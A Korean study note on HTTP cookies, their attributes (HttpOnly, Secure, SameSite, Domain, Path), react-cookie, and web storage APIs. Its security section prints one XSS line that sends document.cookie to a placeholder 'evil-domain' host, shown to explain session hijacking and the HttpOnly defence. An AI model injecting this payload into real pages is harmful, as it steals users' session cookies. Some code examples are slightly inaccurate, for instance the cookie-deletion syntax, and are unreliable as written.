## <mark style="background: #FF5582A6;">Cookie</mark>

![[Pasted image 20240423222130.png|800]]

로그인이 성공하고 서버가 `Set-Cookie` 헤더로 쿠키 값을 보내주면 

클라이언트는 이걸 받아서 다음에 서버로 request를 보낼 때마다 Cookie 헤더로 보낸다.

## <mark style="background: #FFB86CA6;">특징</mark>

1. 쿠키 저장과 request시 쿠키 전송은 브라우저가 알아서 한다.
2. JS로 쿠키 값을 CRUD할 수 있다.
3. 쿠키의 수명을 지정할 수 있다.

즉, stateless HTTP 프로토콜에서 상태 정보를 기억시켜준다.

## <mark style="background: #FFB86CA6;">목적</mark>

1. 세션 관리
서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보 관리

2. 개인화
user preference, theme

3. 트래킹
사용자 행동을 기록하고 분석

옛날에는 쿠키에 정보를 저장했지만 지금은 modern storage API(`localStorage`와 `sessionStorage`)를 이용하는게 좋다.
모든 요청마다 쿠키가 전송되서 정보를 저장하게 되면 성능이 떨어진다.

## <mark style="background: #FFB86CA6;">Set-Cookie header와 Cookie header</mark>

```network
Set-Cookie: <cookie-name> = <cookie-value> // 쿠키 이름과 값을 정의한다.

// <cookie-name> 은 모든 US-ASCII 문자를 포함

// __Secure- 은 HTTPS에서 secure 플래그와 함께 설정

// __Host- 은 secure 플래그 설정 + 구체적인 도메인 없이 경로는 /여야한다.

// <cookie-value> 는 선택적으로 큰 따옴표로 감쌀 수 있고 모든 US-ASCII 문자 포함
// 보통 value 넣기 전에 URL Encoding을 하고 넣는다.

ex)
// Both accepted when from a secure origin (HTTPS)
Set-Cookie: __Secure-ID=123; Secure; Domain=example.com
Set-Cookie: __Host-ID=123; Secure; Path=/

```

`Set-Cookie` HTTP 응답 헤더는 서버로부터 사용자 에이전트로 전송된다.

```network
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

위의 코드를 클라이언트가 받으면 클라이언트는 다음과 같은 코드를 서버로 내려줄 수 있다.

```network
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## <mark style="background: #FFB86CA6;">Cookie 사용법</mark>

## <mark style="background: #FFF3A3A6;">서버에서 response 시</mark>

```network
Set-Cookie: session-id=1234; // 쿠키의 key = 쿠키의 value
Domain=codeit.kr;
Path=/;
HttpOnly;
Secure;
SameSite=Strict;
Max-Age=2592000;
```

나머지는 쿠키와 관련된 attribute이다.

## <mark style="background: #FFF3A3A6;">클라이언트에서 보낼 때</mark>

```terminal
Cookie: session-id=1234;
Domain=codeit.kr;
Path=/;
HttpOnly;
Secure;
SameSite=Strict;
Max-Age=2592000;
```

브라우저가 알아서 쿠키를 보내준다.

## <mark style="background: #FFF3A3A6;">JS로 CRUD</mark>

## <mark style="background: #BBFABBA6;">추가, 수정</mark>

```js
document.cookie = "session-id=1234; Domain=codeit.kr; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000;";
```

쿠키 재설정하는 프로퍼티 `document.cookie`;

## <mark style="background: #BBFABBA6;">값 참조</mark>

document.cookie 값을 참조하면 모든 쿠키의 키와 값이 `;`로 구분된 문자열 형태가 된다.

`cookie` 라는 라이브러리나 `split()` 같은 방법들로 효율적으로 사용할 수 있다.

## <mark style="background: #BBFABBA6;">값 지우기</mark>

`Max-Age` 값을 0으로 업데이트하면 지워진다.

```js
document.cookie = "session-id; Max-Age: 0;";
```

## <mark style="background: #FFF3A3A6;">Cookie Attribute</mark>
## <mark style="background: #BBFABBA6;">HttpOnly</mark>

`document.cookie` 를 해커들이 JS로 조작하는 것을 막는다.

Cross-site scripting (XSS)를 방지하기 위해 존재한다. 서버에서 전송만 되는 쿠키로 만듬

## <mark style="background: #BBFABBA6;">Secure</mark>

HTTPS 프로토콜 상에서 암호화된 요청일 경우에만 전송, 실질적인 보안을 제공하지는 않는다.

```network
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

## <mark style="background: #BBFABBA6;">scope 정의 attribute</mark>

## <mark style="background: #ABF7F7A6;">Domain</mark>

쿠키가 전송되게 될 호스트 명시, 명시 안되어 있으면 현재 문서 위치의 호스트 일부를 기본값으로 한다.

도메인을 명시하면 서브도메인들도 포함된다.

`Domain=codeit.kr` 이면 `https://codeit.kr` 과 `https://abc.codeit.kr`, `https://xyz.abc.codeit.kr` 같은 서브 도메인 모두에 쿠키를 보낸다.

## <mark style="background: #ABF7F7A6;">Path</mark>

`Cookie` header를 전송하기 위하여 요청되는 URL 내에 반드시 존재해야 하는 URL 경로

`%x2F("/")` 문자는 디렉티브 구분자로 해석되며 서브 디렉토리들과 잘 매치된다.

`Path=/docs` 이면 - `/docs`,  `/docs/Web/`, `/docs/Web/HTTP` 전부 다 매칭된다.

## <mark style="background: #BBFABBA6;">SameSite</mark>

제 3자 사이트에서 쿠키를 보내지 못하게 한다. (cross-site 요청과 함께 전송하게 만든다.)

다른 똑같이 생긴 악성 사이트가 개인정보를 저장하고 올바른 사이트로 리퀘스트를 보내는 해킹 수법 방지 CSRF`Cross-site request forgery`

## <mark style="background: #ABF7F7A6;">SameSite value</mark>

기본 값인 Lax value의 정의는 다음과 같다.

> `같은 사이트의 요청이나 안전한 HTTP 요청(GET같은 요청, POST, DELETE 제외)을 담은 a cross-site top-level navigation(웹페이지 이동)은 허용하는 것이다.`

|                                     | SameSite=Strict | SameSite=Lax | SameSite=None |
| ----------------------------------- | --------------- | ------------ | ------------- |
| 다른 사이트에서 우리 사이트로 리퀘스트를 보낼 때         | X               | X            | O             |
| 다른 사이트에서 이미지 파일 등을 받을 때             | X               | X            | O             |
| 다른 사이트에서 사용자가 링크를 클릭해 우리 사이트로 이동할 때 | X               | O            | O             |
| 우리 사이트에서 우리 사이트로 리퀘스트를 보낼 때         | O               | O            | O             |

## <mark style="background: #BBFABBA6;">`Expires` 와 `Max-Age`</mark>

둘다 쿠키의 수명을 지정하는 Attribute이다.

| 쿠키 이름             | 설명                                                                                 |
| ----------------- | :--------------------------------------------------------------------------------- |
| Session Cookie    | 브라우저를 닫으면 지워지는 쿠키(현재 session이 끝날 때 삭제), Expires나 Max-Age를 지정하지 않으면 만들 수 있다.        |
| Persistent Cookie | 수명이 다하면 지워지는 쿠키, Expires나 Max-Age를 지정해서 만듬 (만료 시점의 시간과 날짜는 쿠키가 저장되는 클라이언트의 시간을 기준) |
## <mark style="background: #ABF7F7A6;">Session Cookie</mark>
```
Set-Cookie: sessionId=38afes7a8
```

## <mark style="background: #ABF7F7A6;">Persistent Cookie</mark>
```network
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

## <mark style="background: #BBFABBA6;">Partitioned</mark>

분할 저장소를 사용하여 쿠키를 저장한다.

```network
Set-Cookie: __Host-example=34d8g; SameSite=None; Secure; Path=/; Partitioned;
```

## <mark style="background: #FFB86CA6;">개인 정보와 쿠키</mark>

쿠키를 사용하는 경우 `GDPR` (General Data Protection Regulation) 규정에 따라 개인정보 이용목적을 안내하고 사용자의 동의를 받는 절차가 필요하다.

팝업을 띄우고 동의를 받는 것이 그것 때문이다.

## <mark style="background: #FFF3A3A6;">보안</mark>

## <mark style="background: #BBFABBA6;">session hijacking과 XSS</mark>

```js
new Image().src=
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

위와 같이 session을 가로채서 사용하는 경우가 있다. HttpOnly로 막을 수 있다.

## <mark style="background: #BBFABBA6;">Cross-Site Request Forgery</mark>

원본 사이트에서 로그인해서 쿠키를 갖고 있는 상태에서 해커가 이미지에 결제 URL을 담아서 전송, 그걸 본 유저가 로드하자마자 쿠키와 함께 HTTP요청을 해당 악성 사이트로 보내 송금시키는 느낌의 해킹이 있다.

막기 위해서 주의할 점
1. 입력 필터링
2. 확인 절차 수행
3. 쿠키의 수명을 짧게

## <mark style="background: #FFF3A3A6;">Tracking과 privacy</mark>

## <mark style="background: #BBFABBA6;">Third party cookie</mark>

도메인이 보고 있는 페이지의 도메인이다. - first party cookie

도메인이 다르다 - third party cookie

third party cookie는 다른 도메인의 서버 상에 저장된 이미지 혹은 컴포넌트를 가지고 있을 수 있어 광고와 트래킹에 사용된다.

## <mark style="background: #BBFABBA6;">Do-Not Track</mark>

DNT header를 이용해서 트래킹, Cross-site 사용자 트래킹 전부 비활성화 시킬 수 있다.

## <mark style="background: #FFF3A3A6;">zombie cookie(Evercookies)</mark>

삭제 이후에 다시 생성되는 쿠키

web storage API, Flash 로컬 공유 객체 등 다른 기술 사용해서 자신을 만들어냄.

## <mark style="background: #FF5582A6;">react-cookie</mark>

[[https://www.npmjs.com/package/react-cookie|react-cookie]]

## <mark style="background: #FFB86CA6;">설치</mark>

```
npm install react-cookie
```

## <mark style="background: #FFB86CA6;">Cookies Provider</mark>

서버에서는 cookies props이 req.universalCookies나 new Cookie(cookieHeader)여야 한다.

defaultSetOptions : 쿠키를 설정하는 데 있어서 default value를 설정할 수 있다.

## <mark style="background: #FFB86CA6;">useCookies</mark>

```jsx
const [cookies, setCookie, removeCookie] = useCookies(['cookie-name']);
```

## <mark style="background: #FFB86CA6;">예시</mark>

```jsx
// Root.jsx
import React from 'react';
import App from './App';
import { CookiesProvider } from 'react-cookie';

export default function Root() {
  return (
    <CookiesProvider defaultSetOptions={{ path: '/' }}>
      <App />
    </CookiesProvider>
  );
}
```

```jsx
import React from 'react';
import { useCookies } from 'react-cookie';

import NameForm from './NameForm';

function App() {
  const [cookies, setCookie] = useCookies(['name']);

  function onChange(newName) {
    setCookie('name', newName);
  }

  return (
    <div>
      <NameForm name={cookies.name} onChange={onChange} />
      {cookies.name && <h1>Hello {cookies.name}!</h1>}
    </div>
  );
}

export default App;
```

## <mark style="background: #FF5582A6;">Session Storage와 Local Storage</mark>

## <mark style="background: #FFB86CA6;">Session Storage</mark>

1. 현재 탭에서만 유효한 저장소
2. 탭 닫으면 데이터가 사라진다.
3. 다른 탭과 데이터를 공유하지 않는다.

SessionSorage라는 객체의 메소드를 이용해서 조작한다.


| SessionStorage API method | 설명                              |
| ------------------------- | :------------------------------ |
| .setItem(key,value)       | key=value로 저장하거나 이미 key가 있으면 수정 |
| .getItem(key)             | 값을 참조해서 사용                      |
| .removeItem(key)          | 값 지우기                           |

```jsx
// 값을 저장하는 코드. (이미 값이 있다면) 수정하는 코드
const data = inputElement.value;
sessionStorage.setItem('draft', data);

// 값을 참조해서 사용할 때 
const draftData = sessionStorage.getItem('draft');

// 값 지우기 
sessionStorage.removeItem('draft');
```

## <mark style="background: #FFB86CA6;">Local Storage</mark>

1. 해당 사이트에서 유효한 저장소
2. 탭을 닫거나 브라우저를 닫아도 데이터 유지
3. 여러 탭 사이에서도 데이터 공유

| sessionStorage API method | 설명                              |
| ------------------------- | :------------------------------ |
| .setItem(key,value)       | key=value로 저장하거나 이미 key가 있으면 수정 |
| .getItem(key)             | 값을 참조해서 사용                      |
| .removeItem(key)          | 값 지우기                           |

```jsx
// 사용자가 사이드바 감추기 버튼을 클릭했을 때
// 값을 저장, 수정
localStorage.setItem('show-sidebar', 'false');

// 사용자가 처음 접속했을 때 
const showSidebar = localStorage.getItem('show-sidebar') === 'true';

// 값 지우기 
localStorage.removeItem('show-sidebar');
```

## <mark style="background: #FFB86CA6;">Storage event</mark>

Storage 가 변경되면 `storage` event가 발생한다.

```jsx
window.addEventListener("storage", () => {
  const showSidebar = localStorage.getItem('show-sidebar') === 'true';
    // showSidebar 값 적용하기
});
```

## <mark style="background: #FFB86CA6;">Storage 와 cookie의 차이점</mark>

1. 클라이언트가 만들고 관리하는 데이터이다.
2. JS로 조작 가능
3. 만료 기간이 없음.
4. 사용할 수 있는 용량이 큼

## <mark style="background: #FFB86CA6;">관련 레퍼런스</mark>

[Web Storage API - Web API | MDN](https://developer.mozilla.org/ko/docs/Web/API/Web_Storage_API)

[웹용 스토리지](https://web.dev/i18n/ko/storage-for-the-web/)

[localStorage와 sessionStorage](https://ko.javascript.info/localstorage)

## <mark style="background: #FF5582A6;">실무 활용 사례</mark>

## <mark style="background: #FFB86CA6;">Cookie</mark>

## <mark style="background: #FFF3A3A6;">로그인</mark>

session 기반 인증 : 세션 ID를 쿠키로 보내주면 로그인에 성공시 서버에서 세션 상태를 업데이트한다.

Token 기반 인증 : 로그인에 성공하면 서버가 토큰을 발급해 쿠키로 보내준다.

https://www.codeit.kr/topics/user-system-theory
![[Pasted image 20240424145451.png|800]]
## <mark style="background: #FFF3A3A6;">하루종일 팝업 보지 않기</mark>

하루 동안 다시 보지 않기를 체크하고 닫으면 클라이언트가 수명이 1일인 쿠키를 만들어서 접속할 때 팝업을 안 보여주게 된다.

![[Pasted image 20240424145753.png|800]]
![[Pasted image 20240424145803.png|800]]
## <mark style="background: #FFF3A3A6;">장바구니</mark>

session 기반 인증 : 처음 세션 ID를 쿠키로 주고 이걸 기반으로 서버에서 장바구니 정보를 저장한다.

local storage를 이용한다면, expirly time을 데이터 저장할 때 넣어놨다가 getItem으로 꺼낼 때 expirly time이 지났는지 판단하고 받아오는 로직으로 구현한다.
![[Pasted image 20240424150109.png|800]]
## <mark style="background: #FFB86CA6;">Session Storage, Local Storage</mark>

## <mark style="background: #FFF3A3A6;">draft 임시 저장</mark>

![[Pasted image 20240424150455.png|800]]

Local Storage를 사용해서 구현할 수 있다.

실제로 DB처럼 쓸 수 있는 IndexedDB로 구현되어 있다.

## <mark style="background: #FFF3A3A6;">slack.com</mark>

![[Pasted image 20240424151855.png|800]]

채팅창에 입력하다가 창을 닫아도 내용 저장 > local storage

## <mark style="background: #FFF3A3A6;">웹 앱</mark>

## <mark style="background: #BBFABBA6;">draw.io</mark>

![[Pasted image 20240424151951.png|800]]

각종 설정 값을 로컬 스토리지에 저장

## <mark style="background: #BBFABBA6;">figma.com</mark>

![[Pasted image 20240424152002.png|800]]

이 역시 설정에 대한걸 Local storage에 저장한다.

## <mark style="background: #BBFABBA6;">notion.so</mark>

Local storage에 많은 데이터를 저장 중

LRUCache를 Local storage에 저장하는 것, 자주 쓰는 데이터를 로컬 스토리지에 캐싱해두는 용도